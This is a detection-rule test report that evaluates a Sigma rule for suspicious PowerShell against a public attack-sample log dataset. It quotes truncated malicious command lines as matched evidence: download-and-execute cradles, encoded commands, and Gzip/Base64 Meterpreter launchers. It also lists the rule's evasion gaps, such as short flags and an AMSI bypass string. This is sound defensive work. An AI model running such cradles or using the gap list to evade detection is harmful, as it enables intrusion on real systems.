\# Rule Test Report — T1059.001 Suspicious PowerShell Execution



\*\*Rule file:\*\* `rules/T1059.001\_powershell\_suspicious.yml`

\*\*Test date:\*\* 2026-10-08

\*\*Tester:\*\* Cyberion Detection Engineering Lab

\*\*Dataset:\*\* EVTX-ATTACK-SAMPLES (278 EVTX files, 1,501 Sysmon Event ID 1 records)



\---



\## Test Methodology



A custom Python tester (`test\_rule.py`) replicates the Sigma rule's detection

logic and applies it to every Sysmon Process Creation (Event ID 1) record in

the dataset. A match is recorded when:



1\. Image ends with `\\powershell.exe` \*\*OR\*\* OriginalFileName is `PowerShell.EXE`

2\. AND CommandLine contains at least one suspicious flag, loader, or remote URL



\---



\## Results



| Metric | Value |

|---|---|

| EVTX files scanned | 278 |

| Sysmon EventID 1 records examined | 1,501 |

| Rule matches | \*\*5\*\* |

| Files containing matches | \*\*3\*\* |

| Estimated false positives | \*\*0\*\* |



\---



\## Matched Events



\### 1–2. panache\_sysmon\_vs\_EDRTestingScript.evtx

\*\*ATT\&CK:\*\* T1059.001 — PowerShell

\*\*Detection clauses hit:\*\* loaders (`Start-BitsTransfer`, `Net.WebClient`, `IEX`) + remote (`https://`)



\- `powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/... -Destination Default\_File\_Path.ps1"`

\- `powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/...','Default\_File\_Path.ps1'); IEX((-Join(\[IO.File]::ReadAllBytes(...))))"`



\*\*Verdict:\*\* True Positive — download cradles from a public EDR testing payload.



\### 3. discovery\_sysmon\_1\_iis\_pwd\_and\_config\_discovery\_appcmd.evtx

\*\*ATT\&CK:\*\* T1059.001, T1083 — File and Directory Discovery

\*\*Detection clauses hit:\*\* flags (`-nop`, `-enc`)



\- `powershell.exe -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7...`



\*\*Verdict:\*\* True Positive — encoded PowerShell running under IIS AppPool, typical of web-shell post-exploitation.



\### 4–5. LM\_sysmon\_psexec\_smb\_meterpreter.evtx

\*\*ATT\&CK:\*\* T1021.002 — SMB/Windows Admin Shares, T1059.001

\*\*Detection clauses hit:\*\* flags (`-nop`, `-w hidden`, `-noni`) + loaders (`FromBase64String`)



\- `powershell.exe -nop -w hidden -noni -c "if(\[IntPtr]::Size -eq 4){...};$s=New-Object System.Diagnostics.ProcessStartInfo..."`

\- `"powershell.exe" -noni -nop -w hidden -c \&(\[scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,\[Convert]::FromBase64String('H4sIAIuvyFwC...`



\*\*Verdict:\*\* True Positive — Meterpreter via PsExec/SMB. Second sample shows Gzip+Base64 payload, a classic obfuscation pattern.



\---



\## Detection Coverage Matrix



| Detection Clause | Triggered by |

|---|---|

| `selection\_flags` (`-nop`, `-enc`, `-w hidden`, etc.) | Samples 3, 4, 5 |

| `selection\_loader` (`IEX`, `DownloadFile`, `FromBase64String`, etc.) | Samples 1, 2, 4, 5 |

| `selection\_remote` (`http://`, `https://`) | Samples 1, 2 |



All three detection groups earned their place — removing any one would have caused a miss.



\---



\## Assessment



\- \*\*Sensitivity:\*\* Excellent — 5 TPs / 0 FPs on this dataset.

\- \*\*Coverage:\*\* Detects suspicious PowerShell across three ATT\&CK tactics (Execution, Discovery, Lateral Movement).

\- \*\*Portability:\*\* Verified via conversion to Splunk SPL and Elastic EQL (`rules/T1059.001\_powershell\_suspicious.converted.md`).

\- \*\*Recommendation:\*\* Promote status from `experimental` to `test` after 30 days of no FPs in a production environment.



\---



\## Known Gaps / Limitations



1\. \*\*Does not detect fileless PowerShell\*\* executed inside `powershell\_ise.exe`, `pwsh.exe` (PowerShell 7), or embedded in `mshta.exe`, `rundll32.exe`, `regsvr32.exe`. Future rule needed for those parents.

2\. \*\*Bypassable by short flags\*\* like `-e` (instead of `-ec`/`-enc`). Add ` -e ` and ` -e:` variants in a future revision — but only after FP testing.

3\. \*\*Does not correlate with network events\*\* (Sysmon ID 3). A companion rule matching outbound connections from PowerShell would strengthen coverage.

4\. \*\*AMSI bypass strings not covered\*\* — e.g. `amsiInitFailed`. Consider a separate rule targeting `ScriptBlockText` in PowerShell Operational log (Event ID 4104).



\---



\## Reproducing this Test



```cmd

python verify.py          # confirm dataset integrity

python test\_rule.py       # run rule against all 278 EVTX files

